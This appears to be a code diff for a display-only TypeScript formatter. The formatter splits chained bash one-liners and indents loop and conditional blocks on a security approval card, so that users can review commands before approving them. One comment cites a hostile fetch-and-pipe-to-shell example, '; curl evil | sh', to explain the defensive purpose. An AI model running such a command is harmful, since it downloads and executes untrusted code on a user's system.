@@ -1,54 +1,141 @@
+// Control-flow keywords the splitter understands. `do`/`then` close a block
+// header and open its body, `done`/`fi` close a block, and `else`/`elif` do
+// both. `case`/`esac` are deliberately absent: a case body needs its own indent
+// rules, and the existing split after `;;` already reads well without them.
+const BLOCK_OPEN = new Set(['do', 'then', 'else'])
+const BLOCK_CLOSE = new Set(['done', 'fi', 'else', 'elif'])
+// Keywords that start a block header. Everything up to the matching `do`/`then`
+// is one condition, so a `;`/`&&`/`||` inside it must NOT start a new line -
+// `if a && b; then` is one step, not two.
+const BLOCK_HEADER = new Set(['for', 'select', 'while', 'until', 'if', 'elif'])
+const BLOCK_INDENT = '    '
+
+// bareWordAt returns the unquoted lowercase word starting at i, provided it is a
+// whole token (the character after it delimits). The caller is responsible for
+// only asking when i is in command position - in `echo done` the `done` is an
+// argument, not a keyword.
+function bareWordAt(cmd: string, i: number): string {
+  const match = /^[a-z]+/.exec(cmd.slice(i))
+  if (!match) return ''
+  const after = cmd[i + match[0].length]
+  return after === undefined || /[\s;&|()<>]/.test(after) ? match[0] : ''
+}
+
 // splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
-// chained one-liner reads as separate steps. It is deliberately optimistic: it
-// only tracks quotes and backslash escapes, not the full shell grammar, and a
-// command that already contains newlines is left exactly as written.
+// chained one-liner reads as separate steps, and lays a `for`/`while`/`until`/
+// `if` block out over its own indented lines. It is deliberately optimistic: it
+// only tracks quotes, backslash escapes and command position, not the full shell
+// grammar, and a command that already contains newlines is left exactly as
+// written.
 //
-// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
-// character, so every byte of the original command is still shown in the same
-// order (just with extra line breaks). That property is what makes it safe to use
-// on the security approval card - the text a user approves is byte-for-byte the
-// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
-// spot, never harder.
+// It is DISPLAY-ONLY. The only edits it makes are inserting line breaks and
+// leading indentation, and dropping the run of spaces that a break just turned
+// into trailing whitespace - every other byte of the original command is still
+// shown, in the same order. That property is what makes it safe to use on the
+// security approval card: the text a user approves is the command that runs;
+// splitting merely makes a buried `; curl evil | sh` easier to spot, never
+// harder.
 export function splitBashChains(cmd: string): string {
   if (cmd.includes('\n')) return cmd
   let out = ''
+  // The next break to emit, flushed lazily so the indent is computed at the
+  // depth the line it starts actually sits at (a line opening with `done` has
+  // already dropped a level by the time the break is written).
+  let pending = ''
+  let depth = 0
   let inSingle = false
   let inDouble = false
   let escaped = false
+  // Whether the next bare word starts a command - only there is `done` the
+  // keyword rather than an argument.
+  let commandStart = true
+  // Whether we are inside a block header, between `if`/`for`/... and its
+  // `then`/`do`, where chain operators join one condition instead of separating
+  // steps.
+  let inHeader = false
+
+  const emit = (text: string) => {
+    if (pending) {
+      out += pending === '\n' ? '\n' + BLOCK_INDENT.repeat(depth) : pending
+      pending = ''
+    }
+    out += text
+  }
+
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
-    out += ch
     if (escaped) {
+      emit(ch)
       escaped = false
       continue
     }
     if (ch === '\\') {
+      emit(ch)
       escaped = true
+      commandStart = false
       continue
     }
     if (ch === "'" && !inDouble) {
+      emit(ch)
       inSingle = !inSingle
+      commandStart = false
       continue
     }
     if (ch === '"' && !inSingle) {
+      emit(ch)
       inDouble = !inDouble
+      commandStart = false
       continue
     }
-    if (inSingle || inDouble) continue
+    if (inSingle || inDouble) {
+      emit(ch)
+      continue
+    }
+
+    const keyword = commandStart ? bareWordAt(cmd, i) : ''
+    if (keyword && (BLOCK_OPEN.has(keyword) || BLOCK_CLOSE.has(keyword) || BLOCK_HEADER.has(keyword))) {
+      if (BLOCK_CLOSE.has(keyword)) {
+        depth = Math.max(0, depth - 1)
+        inHeader = false
+        if (out && pending !== '\n') pending = '\n'
+      }
+      emit(keyword)
+      i += keyword.length - 1
+      commandStart = false
+      if (BLOCK_HEADER.has(keyword)) inHeader = true
+      if (BLOCK_OPEN.has(keyword)) {
+        // The body starts on its own line, one level in.
+        depth++
+        inHeader = false
+        pending = '\n'
+        while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
+        commandStart = true
+      }
+      continue
+    }
+
     // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
     // second character. A single `|` (pipe) or `&` (background/redirect) does
-    // not.
+    // not, though both still put what follows in command position.
     const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
-    if (!isChain) continue
-    if (ch !== ';') out += cmd[++i]
-    while (cmd[i + 1] === ' ') i++
+    if (!isChain) {
+      emit(ch)
+      if (/[;&|({!]/.test(ch)) commandStart = true
+      else if (!/\s/.test(ch)) commandStart = false
+      continue
+    }
+    emit(ch)
+    if (ch !== ';') emit(cmd[++i])
+    while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
+    commandStart = true
+    if (i + 1 >= cmd.length) continue
     // Keep the conventional error-suppression suffixes attached to the command
     // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
     // visually orphaned no-op on its own line and makes the script harder, not
     // easier, to scan. Other control chains still split normally.
     const rest = cmd.slice(i + 1).trim()
     const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
-    if (i + 1 < cmd.length) out += trivialFallback ? ' ' : '\n'
+    pending = inHeader || trivialFallback ? ' ' : '\n'
   }
   return out
 }
